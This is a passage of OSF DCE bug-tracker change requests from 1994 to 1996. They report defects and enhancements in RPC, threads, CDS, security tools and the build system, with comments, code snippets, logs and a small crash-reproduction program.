dce_db_fetch() will be called from server stubs, where allocated
memory is freed by the rpc runtime when the call returns.

Some ambitious soul could do something like this:
when reading an item from a database with dce_db_fetch(), swap new memory
allocation and free functions [with rpc_sm_swap_client_alloc_free()] that
will remember all the things allocated, grouped by address of the structure
fetched.  Then have dce_db_free() go through the list of things, looking for
the address of that structure.

However, the manpage for rpc_sm_swap_client_alloc_free() says this is
used by clients, so this may not work anyway.

It would be great if idl could write a free function into the stub file.
idl knows what the structures all look like, so it may be straightforard.

[7/25/96 public]
wish list...



CR Number                     : 10156
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : aix
Component Name                : thr
Subcomponent Name             : cma
Short Description             : cma_sigaction fails on RIOS
Reported Date                 : 3/16/94
Found in Baseline             : 1.0.2a
Found Date                    : 3/16/94
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public
Transarc Deltas               : 
Transarc Herder               : jaffe@transarc.com
Transarc Status               : open

[3/16/94 public]
When I tried to use sigaction I got a compilation error on the RIOS.  The problem is related to the fact that cma_px.h contains:
#define sigaction cma_sigaction
But the structure used for arguments are also called sigaction and CMA
makes no attempt to declare "struct cma_sigaction".



Added field Transarc Deltas with value `' 
Added field Transarc Herder with value `jaffe@transarc.com' 
Added field Transarc Status with value `open'



CR Number                     : 10105
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : cds
Subcomponent Name             : all components
Short Description             : Code cleanup and i18n drop
Reported Date                 : 3/9/94
Found in Baseline             : 1.1
Found Date                    : 3/9/94
Severity                      : D
Priority                      : 1
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[3/9/94 public]
This is the first pass code cleanup and internationalization.



CR Number                     : 10093
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : dcecp
Subcomponent Name             : tcl
Short Description             : implement -x in Tcl_Eval()
Reported Date                 : 3/8/94
Found in Baseline             : 1.1, 1.2
Found Date                    : 3/8/94
Severity                      : B
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : nextrel
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[3/8/94 public]
In order to make "dcecp -x" work like "sh -x" the right thing to do is to
put the functionality in Tcl_Eval() itself and create a new Tcl API to turn
it on or off.  Have to check if all the Tcl_Eval* family of routines call
Tcl_Eval.  Create a function:

  void Tcl_EvalEcho(Interp *interp, int boolean)
  {
     global_print_commands = boolean
  }

that sets a global variable and triggers printf("%s",cmd); in Tcl_Eval()
before the command is executed.  Think about thread-safety.

Priority is high since functional testing could use this functionality.

[6/5/96 public]
Changed from 'defer' to 'open'.  Still an enhancement.



CR Number                     : 10058
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : i486
S/W Ref Platform              : osf1
Component Name                : sec
Subcomponent Name             : passwd_import
Short Description             : Password visible on command line.
Reported Date                 : 3/2/94
Found in Baseline             : 1.1b3
Found Date                    : 3/2/94
Severity                      : B
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[3/2/94 public]
The passwd_import command takes a password on the (shell) command line.
This is a security hole, since command lines can be displayed by the ps
command.

Note that the dce_login command has the same problem.  However, in that case,
we can finesse the problem by saying dce_login is "only an example program,
and is not an officially supported DCE deliverable".  Fair enough.  However,
I note that dce_login is explicitly cited in the manpages for cdsadv and
cdsclerk (in the Admin Ref), so they should be scrubbed from there.
I believe dcecp is going to make dce_login obsolete, and it doesn't have
the same exposure-of-password problem.

[3/3/94 public]
I've now learned that dce_login is indeed officially supported and documented
in the User's Gd and Ref.  The doc says dce_login is "supplied for use in DCE
configuration", however by virture of it's being documented it's not solely a
dce_config-internal implementation detail.  In any case, it has the
password-exposure problem mentioned above, so something needs to be done about
that.

One suggestion is that instead of supporting passwords on the command line,
dce_login and friends could search a file for the password, a la .netrc.



CR Number                     : 10023
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : rs6000
S/W Ref Platform              : aix
Component Name                : cds
Subcomponent Name             : 
Short Description             : Show Obj, non-existent value "succeeds"
Reported Date                 : 2/25/94
Found in Baseline             : 1.0.3
Found Date                    : 2/25/94
Severity                      : E
Priority                      : 3
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[2/25/94 public]
Add attribute TEST_small to the cds_attributes file.  Create directory /.:/dir1 and 
object /.:/dir1/obj1 using CDSCP, then do CDSCP show object /.:/dir1/obj1 with
TEST_small = 40.  The command prompt returns, return code is 0, but nothing is
returned since TEST_small does not have the value 40.  This should not be reported
as success since the show command did not really succeed.  The same problem occurs
with Show Child, Show Link, and Show Directory.



CR Number                     : 10020
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : thr
Subcomponent Name             : threads
Short Description             : atfork() returns exception instead of errno value on error.
Reported Date                 : 2/25/94
Found in Baseline             : 1.0.2
Found Date                    : 2/25/94
Severity                      : C
Priority                      : 3
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : cma_ux.c
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[2/25/94 public]
The atfork() function does not return a value but raises an exception
for insufficient memory, which is incorrect, as users may not be
using exceptions. Change the routine that allocates the fork structure
to hold the fork routines to return a value of -1 and an errno of
ENOMEM if insufficient memory exists, per the Threads AES section 2.2.3.

For instance, where the (exc_s_insfmem) exception is raised, return
the errno instead, to give:

 if((cma_t_address)entry == cma_c_null_ptr) {
    cma__set_errno (ENOMEM);
    status = -1;
    }
  .
  .
  .
 return status;
  .
  .
  .

DISCLAIMER: The above is an example. The fix may be accomplished
            differently than exampled and may involve more than shown.



CR Number                     : 10017
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : bld
Subcomponent Name             : 
Short Description             : install modes wrong on most files
Reported Date                 : 2/25/94
Found in Baseline             : 1.1b2
Found Date                    : 2/25/94
Severity                      : E
Priority                      : 3
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[2/25/94 public]
The install modes on most files are wrong.  Only executable binaries
should have their execute bits set.  osf.std.mk sets IMODE to 755.
This is only appropriate for a small fraction of the installed files.
The common makefiles could look at the suffix and make a better guess,
or not set the mode at all, since when a program is linked successfully,
it is given the x bit.  Other (data, .h, .idl, etc.) files already have
correct (or closer to correct) mode set.  Also, installed files should
probably not be writable.

[2/6/96 public]
Since not all vendors use install tree as their binary release, lowered to 
enhancement. Its a matter of how things are packaged when released to end 
users. The way it works has not caused any problems.



CR Number                     : 9978
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : rs6000
S/W Ref Platform              : aix
Component Name                : bld
Subcomponent Name             : 
Short Description             : rules for linking processes with shared libraries are wrong
Reported Date                 : 2/18/94
Found in Baseline             : 1.1
Found Date                    : 2/18/94
Severity                      : E
Priority                      : 3
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[2/18/94 public]
We have build libdce.a on a machine called snirs3 in a sandbox
/project/dirx/build/predce11. This sandbox is backed to 
/project/dce/build/dce1.1. Then we have built a process
gdsditadm in this sandbox; this sandbox was linked with "-ldce".
All worked fine. Then we have installed DCE and GDS on another
machine (snirs1). On snirs1 /project/dirx/build/predce11 does not
exist. But /project/dce/build/dce1.1 exists on both machines.
If I start gdsditadm on snirs1 I get a lot of unresolved symbols.
The reason was that not the installed libdce.a in /usr/lib was
taken but the /project/dce/build/dce1.1/export/rios/usr/lib/libdce.a.

The reason for that seems to be that the rules for building processes
on RIOS define a LIBPATH beginning with /project/dirx/build/predce11/...,
followed by /project/dce/build/dce1.1/export/rios/usr/lib, followed by
/usr/lib. If /project/dirx/build/predce11/export/rios/usr/lib does not
exist the"old" libdce.a from /project/dce/build/dce1.1/export/rios/usr/lib
is taken. This is a part of the loadmap file when I link gdsditadm
with "-bloadmap":

(ld):
insert /project/dirx/build/predce11/export/rios/usr/lib/libdce.a
0706-406 IMPORT_FILE: 7510 symbols imported.
(ld):
insert /usr/lib/libc.a
0706-406 IMPORT_FILE: 14 symbols imported.
0706-406 IMPORT_FILE: 2575 symbols imported.
0706-406 IMPORT_FILE: 2 symbols imported.
...
(ld):
mismatch
0706-294 No type mismatches detected.
(ld):
er full
0706-297 No unresolved symbols detected.
...
(ld):
libpath /project/dirx/build/predce11/export/rios/usr/lib:/project/dirx/build/pre
dce11/export/rios/usr/lib:/project/dce/build/dce1.1/export/rios/usr/lib:/usr/lib
:/lib
0706-474 LIBPATH:  Library path set to /project/dirx/build/predce11/export/rios/
usr/lib:/project/dirx/build/predce11/export/rios/usr/lib:/project/dce/build/dce1
.1/export/rios/usr/lib:/usr/lib:/lib

This LIBPATH shouldn't be set; it gives problems whenever you
build on one machine and install on another machine where the build
sandbox is not available - but the backing build is.
It is not a gds problem - it seems to be a general problem in the rules.


define a 
all what

[zeliff 2/18/94 public] 
Re-assigned to the Rats for investigation as this sounds like a common
makefile problem.

[04/27/94 public]
Bumped priority and severity because it's really hard to work in this
environment. 
We have only two RIOS machines - both are used as test machines (one
for functional tests, one for code coverage). Both have mounted the
/project/dirx/build  which contains the nigthly build.
If the nigthly build has built a libdce that is bad it shouldn't effect
the installation. But it does.
Waiting again for an answer ...


[ annie ]
This is the behavior of the RIOS loader for shared images.  So, as a
workaround for now, please set LIBPATH in your environment to /usr/lib.

[05/04/94 public]
OK. We will use this workaround. But anyway: This should be fixed if
it is really a problem of the "build". If it is a common RIOS problem
we will continue to use the workaround.

[07/01/94]
Lowered the severity - since there is a workaround and because it
seems to be a problem with the way the rios loader behaves.

[02/06/96 public]
Made an Enh req. IBM can take the lead and fix the makefiles otherwise
we can continue using static libraries.



CR Number                     : 9971
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : mx300
S/W Ref Platform              : sinix
Component Name                : cds
Subcomponent Name             : gda_clerk
Short Description             : gda_clerk gives error message on fully resolved cell name
Reported Date                 : 2/16/94
Found in Baseline             : 1.0.3
Found Date                    : 2/16/94
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[2/16/94 public]

I have set up two cells and configured DNS to know about them.

According to the porting guide one can use gda_clerk to test whether
the setup is configured properly.  If I use gda_clerk to test the
configuration I get:

	./gda_clerk
	String Binding: 1daad4a1-2a1f-11cd-a707-0000c0e48656@ncacn_ip_tcp:140.231.30.181[2076]
	Name: /.../p.cells.sni-usa.com
	Flags: done
	ResolvedName:
	UnResolvedName: /.../p.cells.sni-usa.com
	Unresolved name uuid: 11ed2286-49bb-11ca-8f29-08002b0dc46c
	No replica set returned
	CDS error Status 12
	Conversion error: "status 0000000c (unknown facility)"

The debug output from gdad shows that it did really resolve this cellname:

	gdad: receiving bind response from 140.231.30.242[53]
	gdad: enter bindq_ext_to_int
	HID=0;RESPONSE;RA;No error;QDCOUNT=1;ANCOUNT=2;NSCOUNT=1;ARCOUNT=1
	p.cells.sni-usa.com;ANY;IN
	p.cells.sni-usa.com;HINFO;IN
	TTL=-96(4byte)
	RDLength=122;"1 e7a2c461-2a1b-11cd-8ad7-0000c0ea7a56   Master psycho_ch e4f41f20-2a1b-11cd-8ad7-0000c0ea7a56 p.cells.sni-usa.com","DCECDS"
	recv_bind(): post bindq_ext_to_int:dumping recv_answ:
	>Dumping list <0x826a030>:
	>>> rec=0x826ad8c;data=0x826a074
	>>> rec=0x8271a74;data=0x8270d5c
	>>> rec=0x82c4ef8;data=0x82c4188
	>>> rec=0x82c5c98;data=0x82c4f80
	>>> rec=0x82c8a28;data=0x82c7d10
	>>> rec=0x82c97c8;data=0x82c8ab0
	>End of list <0x826a030>
	gdad: recv_bind(); comparing question "/p.cells.sni-usa.com" with answer "/p.cells.sni-usa.com"
	recv_bind(): in matchloop: status = 5
	recv_bind(): after matchloop: found = 1
	recv_bind(): Before mutex lock
	recv_bind(): After mutex lock
	recv_bind(): Sucessfully completed
	bind_process(): About to look at answers
	bind_process(): About to look at head list
	bind_process(): in trucate test loop;tag_rr=1
	bind_process(): in trucate test loop;tag_rr=5
	bind_process(): in e_cds_cell_info_txt;tag_rr=3
	bind_process(): in e_cds_cell_info_txt/e_addr: n1="/p.cells.sni-usa.com";n2="/p.cells.sni-usa.com"
	bind_process(): in e_cds_cell_info_txt;tag_rr=2
	bind_process(): in e_cds_cell_info_txt;tag_rr=3
	bind_process(): in e_cds_cell_info_txt/e_addr: n1="/p.cells.sni-usa.com";n2="/psycho.cells.sni-usa.com"
	bind_process(): Truncation free
	bind_process(): in trucate test loop;tag_rr=3
	bind_process(): in trucate test loop;tag_rr=2
	bind_process(): in e_nameserver;tag_rr=3
	bind_process(): in trucate test loop;tag_rr=3
	bind_process(): seemingly, a match was found; elem:/p.cells.sni-usa.com"
	NS uuid: e7a2c461-2a1b-11cd-8ad7-0000c0ea7a56
	CH uuid: e4f41f20-2a1b-11cd-8ad7-0000c0ea7a56
	bind_process(): an answer was found

I think that the reason this failed was because of the following code in
gda_rpcint.c in built_progress:

	if ((status == DNS_SUCCESS) && (el->unresolved_out_q.fn_length <= 1))
	    switch (type) {
	    case ET_directory:
	    case ET_dirOrObj:
		break;
	    default:
		status = DNS_UNKNOWNENTRY;
	    }

Even though the name was resolved correctly, the status is set to 
DNS_UNKNOWNENTRY.  This is because the gda_clerk passes a 'type' of
ET_object.

It seems like 'ET_object' should be added as part of the case statement
which succeeds.



CR Number                     : 9970
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : hppa
S/W Ref Platform              : hpux
Component Name                : rpc
Subcomponent Name             : idl
Short Description             : variadic functions should use ANSI stdarg facility
Reported Date                 : 2/16/94
Found in Baseline             : 1.1
Found Date                    : 2/16/94
Severity                      : D
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : see below
Sensitivity                   : public

[2/16/94 public]

There are several places in the IDL compiler (errors.h/errors.c is on
example) where functions taking a varying number of arguments are declared
using the old "printf" style of argumentlist (arg1, arg2, arg3, etc.).
These functions are declared with no prototype (e.g. using the pre-ANSI 
function declaration ... void error_print()).

In order to meet the spirit of code cleanup guidelines for DCE 1.1, 
all such functions should be re-written to use the mechanisms defined via
stdarg.h, and prototypes for these functions should be supplied.



CR Number                     : 9964
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : rpc
Subcomponent Name             : idl
Short Description             : switch statements don't catch all cases
Reported Date                 : 2/16/94
Found in Baseline             : 1.1
Found Date                    : 2/16/94
Severity                      : D
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : see below
Sensitivity                   : public

[2/16/94 public]

Several functions in the idl compiler code contain switch statements based
on an enumerated type. However, a "case xxx" entry doesn't exist for all
values of that type, and there is no default entry. 

The files and functions are as follows:  

rpc/idl/idl_compiler/astp_cpx.c, in function AST_find_self_reference().

rpc/idl/idl_compiler/propagat.c, in function PROP_type_info() 

rpc/idl/idl_compiler/cspell.c, in function CSPELL_scalar_type_suffix() 

This condition generates a warning when using the gcc compiler on the AT386 
machines when the "-Wswitch" argument is given.



CR Number                     : 9957
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : hppa
S/W Ref Platform              : hpux
Component Name                : rpc
Subcomponent Name             : 
Short Description             : server shutdown not fully supported
Reported Date                 : 2/15/94
Found in Baseline             : 1.0.3
Found Date                    : 2/15/94
Severity                      : B
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[2/15/94 public]

The normal server side shutdown processing does not provide an opportunity
for the RPC protocols to cleanly finish calls which may be in progress
(or recently completed).

For example, with the DG protocol it may be necessary to retransmit a
call's OUT parameters.  This would normally occur *after* the call's thread
had been returned to the thread pool.  Since we currently only wait until 
all threads have been returned to the pool before returning (from 
rpc_server_listen), it's possible that the client will never receive the 
results of its (successful) call.

I don't know if the current behavior had any impact on the CN protocol.



CR Number                     : 9956
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : rpc
Subcomponent Name             : DG
Short Description             : rpc__dg_call_did_mgr_execute lies
Reported Date                 : 2/15/94
Found in Baseline             : 1.0.3
Found Date                    : 2/15/94
Severity                      : B
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[2/15/94 public]

The routine rpc__dg_call_did_mgr_execute() reports that the server's
manager routine was not entered if 1) the binding handle has *a* server
boot time, and 2) the call in question got rejected with a "wrong boot
time" reject.

Dale Labossiere points out that this is wrong.  The call may very well
have been executed by the first server (whose boot time the client knows),
which then crashed before sending the response.  A new server instance
is then started, the client retransmits, and the new server rejects the
retransmitted request with "wrong boot time."



CR Number                     : 9948
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : rpc
Subcomponent Name             : dg
Short Description             : Server-not-up exception nukes all threads using binding handle
Reported Date                 : 2/11/94
Found in Baseline             : 1.0.3a
Found Date                    : 2/11/94
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[2/11/94 public]
We've noticed a problem with RPCs that occurs when several threads share
a binding handle.  If the [comm_status, fault_status] attributes aren't
set, so that the client expects an exception on comm_failure errors,
when a comm_failure error occurs, it returns an exception as expected,
but it also trashes the other threads currently using the binding handle.
In DCE 1.0.3 it actually wipes out the entire process with an abort.
In DCE 1.0.2 the process continues, but the other threads are wedged
making the RPC forever.
We tried HP, RS/6000, and Sun 1.0.2 platforms, and an RS/6000 1.0.3
platform.
This occurs when using ncadg (UDP) bindings.  We haven't tested TCP bindings.
Here is an example .idl file and C program to reproduce the problem:
Invoke foo with an UDP string binding as a parameter. 
Example:
    % foo 'ncadg_ip_udp:192.55.207.149[1619]'
--------------------------------------------------------------------------
foo.idl
--------------------------------------------------------------------------
[version(1)]
interface foo{
	void fooRpc([in] handle_t h);
}
--------------------------------------------------------------------------
foo.c
--------------------------------------------------------------------------
#include <dce/rpc.h>
#include <pthread.h>
#include "foo.h"    
# define CHECK(i) if((i)) {printf("Bad Status"); exit(1);}
void *SendThread(h)
  void *h;
{
    TRY
	fooRpc((handle_t)h);
    CATCH_ALL
	printf("Caught Exception .....\n");
    ENDTRY
}
main(argc,argv)
  int argc;
  char **argv;
{
    unsigned32 i;
    handle_t h;
    pthread_cond_t c1;
    pthread_mutex_t m1;
    rpc_binding_from_string_binding(argv[1],&h,&i);
    CHECK(i);
    for(i=0;i<5;i++){
	pthread_t threadId;
	CHECK(pthread_create(&threadId,
			   pthread_attr_default,
			   SendThread,
			   h));
       CHECK(pthread_detach(&threadId));
    }
    /* Block the main thread */
    CHECK(pthread_cond_init(&c1,pthread_condattr_default));
    CHECK(pthread_mutex_init(&m1,pthread_mutexattr_default));
    CHECK(pthread_mutex_lock(&m1));
    CHECK(pthread_cond_wait(&c1,&m1));
}

[2/14/94 public]

Even in DCE 1.0.3 other call threads are conditional waiting in
ccall_binding_serialize()::dgccall.c forever because nobody cancels them.
Even if they get cancelled they will retry waiting forever unless the
cancel timeout is set to the finite value.

The CN protocol has the different story because the serialization is done
only while the binding is being resolved, which doesn't happen with the
fully bound binding. All call threads' connection requests will just fail.



CR Number                     : 9947
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : hppa
S/W Ref Platform              : hpux
Component Name                : sec
Subcomponent Name             : 
Short Description             : acl_edit accepts both -ic & -io swithes.
Reported Date                 : 2/11/94
Found in Baseline             : 1.1
Found Date                    : 2/11/94
Severity                      : E
Priority                      : 4
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[2/11/94 public]

Try this:

> acl_edit /.:/hosts -io -ic
sec_acl_edit> l

# Initial SEC_ACL for directories created under: /.:/hosts:
# Default cell = /.../ice_cell.osf.org
unauthenticated:r--t---
group:subsys/dce/cds-admin:rwdtcia
group:subsys/dce/cds-server:rwdtcia
any_other:r--t---

The only way you know what ACL type you are working with is by
looking at the comment generated with the "list" sub-command.  Here, 
acl_edit gets the initial container ACL for the specified object 
using the last switch specified.

An error should be displayed that only one of these switches, -e, -ic, 
and -io, can be specified on an ACL object.

[7/14/94 public]
Moved to dcecp component for Howard to look at prior to setting status
to defer to 1.2  (dcecp now performs most functions of the control programs)

[7/18/94 public]
This CR either does not affect dcecp or has a related CR open.
It really belongs to acl_edit and should not be changed back to dcecp.

[8/1/94 public]
All control program bugs are being changed to E4 due to the existance
of dcecp.



CR Number                     : 9941
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : rpc
Subcomponent Name             : comauth
Short Description             : Problems with auth_info refcount
Reported Date                 : 2/11/94
Found in Baseline             : 1.1
Found Date                    : 2/11/94
Severity                      : B
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : comauth.c
Sensitivity                   : public

[2/11/94 public]

There seems to be some recount problems in the rpc runtime auth code.

I am not sure if HP owns this code or not....

Mail message follows:
----------------------------------------------------------------------
>From: Max Grasso <max@osf.org>

More security code issues

As said in previous message, Rob tried the new lock setup in the evs_erb.
Things worked fine for about 70,000 RPCs, then we got an assert in the
rpc/runtime sources, file comauth.c, line 469 
    
    assert(auth_info->refcount >= 1);

The only thing, evs_erb was using heavily at that point was the binding copy
and binding free calls (the set_auth_info was serialized) and the only
reason for this to happen seems to be the fact that the refcount fails
to be appropriately increased when it should.

So browsing a bit more through the sec stuff to make sure it was not an
evs_erb problem, here are some more issues with the sec code.  As in
the previous case these are browsing observations, I never stepped through
this code, so it's easy to be wrong (let me know if you think so).

The file in question is again comauth.c



1) Both rpc__auth_info_reference and rpc__auth_info_release do an
   
    auth_info->refcount--; or  auth_info->refcount++;

   without using any mutexes.

   This is dangerous since those are not atomic instructions (not
   usually and not on the 486/OSF1).
   Moreover those variables once increased can be kept in
   registers until the next function call due to compiler optimization.
   This makes the window for parallel increase/decrease sligthly
   larger. 

   
2)  rpc__auth_info_release does 

        if (auth_info->refcount == 1)
        {
            /*
             * The auth info can be removed from the cache if there is only
             * one reference left to it. That single reference is the cache's
             * reference. 
             */
            rpc__auth_info_cache_remove (auth_info);
        }

    Another thread could come in between and increase the refcount, but
    the auth_info would be removed from the cache.  In reality since
    rpc__auth_info_cache_remove tests it again it will not happen here.
   
    It can happen though right in  rpc__auth_info_cache_remove as follows.

 
3)  rpc__auth_info_cache_remove

     if (auth_info->refcount == 1)
    {
        RPC_LIST_REMOVE (auth_info_cache, auth_info);
        info_type = auth_info->is_server?"server":"client";
        RPC_DBG_PRINTF ....
        assert(auth_info->refcount >= 1);
        auth_info->refcount--;
    }


    Other threads can access authinfo->refcount without getting the
    cache mutex (as in the above ...info_reference and ...info_release
    calls).
    Thus a the auth_info can be removed from the cache even if the
    ref_count is > 1.


Of course all these problems will show when hitting on the same
auth_info not on different ones.



Max


End of mail message ----------------------------------------------

[2/14/94 public]

Since auth_info->refcount is unsigned16, it will overflow if you don't call
rpc_binding_free(). But, I believe that this was not the case here because
the application was heavily calling rpc_binding_copy() and
rpc_binding_free(). (Well, *_reference()/*_release() functions should
return the error status back to the caller instead of aborting the process
by the assertion when the over/under flow happens...)

In general, the refcounts are protected by the mutex. Typically the caller
of *_reference()/*_release() functions holds the RPC runtime's global mutex
or the call handle's mutex. However, rpc_binging_copy()::combind.c is
calling rpc__auth_info_reference()::comauth.c without holding any mutex
locked. (There could be others. I haven't done the thorough investigation.)
Also, holding the call handle's mutex won't be enough when changing the
shared objects, i.e., auth_info. On the other hand, we could argue that it
is the application's responsibility for doing the concurrency control for
rpc_binding_copy(), e.g., the source (shared) binding is being changed by
the another thread while one is calling rpc_binding_copy(). (See RPC Data
Types and Structures, Binding Handle in intro_rpc(3).)



CR Number                     : 9924
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : i486
S/W Ref Platform              : osf1
Component Name                : bld
Subcomponent Name             : 
Short Description             : use tar -xfo, when EXPORT_USING_TAR is set
Reported Date                 : 2/10/94
Found in Baseline             : 1.1
Found Date                    : 2/10/94
Severity                      : E
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[2/10/94 public]

If EXPORT_USING_TAR is set and the export directory is NFS mounted,
then tar -xf complains, because it tries to change the creation time of
the exported file (seems to be an NFS internal: first copy, then chown, then
chmod), but the exported file belongs to the owner of the original file.
Using tar -xfo helps.

[2/6/96 public]
Changed to Enh req.



CR Number                     : 9923
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : rs6000
S/W Ref Platform              : aix
Component Name                : cds
Subcomponent Name             : cdsbrowser
Short Description             : CDS Browser slider does not work as documented.
Reported Date                 : 2/9/94
Found in Baseline             : 1.0.3
Found Date                    : 2/9/94
Severity                      : E
Priority                      : 3
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[2/9/94 public]

In the CDS Browser, when the right slider is used and then released, the entry
which was displayed in the index window is not always at the top of the main
window display.
Sometimes it is a few lines down and sometimes it is not displayed at all.

To reproduce the problem:

Start the Browser and expand the whole namespace using the "Expand All"
option in the "File" menu.

Put the cursor on the slider bar and slide the bar up and down.
A small index window appears at the top of the browser and displays the current
entry.
When you release the mouse button, this entry should be at the top of the main
Browser window, below the line (above the line is the directory path).

Sometimes it is there, sometimes a few lines down and sometimes not on the
display at all.

The description of how this should work is in the OSF User's Guide and
Reference, Chapter 2., Browsing the Cell Namespace.



CR Number                     : 9922
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : sec
Subcomponent Name             : kinit
Short Description             : make kinit user friendly
Reported Date                 : 2/9/94
Found in Baseline             : 1.1
Found Date                    : 2/9/94
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[2/9/94 public]

The kinit command should warn the user when the requested 
lifetime exceeds the maximum permitted in the registry.
Currently, kinit will quietly set the lifetime to the
max permitted when the requested lifetime is larger than
the maximum permitted.

[2/9/94 public]
kinit isn't the one quietly setting the lifetime to the max permitted.
It just asks for a ticket with a specified lifetime.  It's the registry
that (as spec'd) clips the requested lifetime to a value within the min-max
range.  I'll leave this open as an enhancement request that kinit check the
expiration time and issue a warning if it was different than the
requested time.

[2/9/94 public]
It would also be nice if kinit allowed you to put the password on the
command line, like dce_login.

[2/10/94 public]

Extending kinit to take an ascii password is a no-no  since this could
encourage the use of hard-coded ascii passwords in scripts (a security
hole). I went through this issue during DCE 1.0.2 .

Of course, the same argument could be made against dce_login_noexec 
(widely used in dce_config) or dce_login . The only justification (my 
opinion only - since I have never seen it spelt out clearly anywhere) 
that I can think of is that in this case dce_login is considered a
'sample' program whereas kinit is not.

[ If I recall correctly, an option was added to kinit (from Athena) 
  which would read the (encrypted not ascii) password from a keytab file.
  DCE's version of kinit does not however have this option ]



CR Number                     : 9914
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
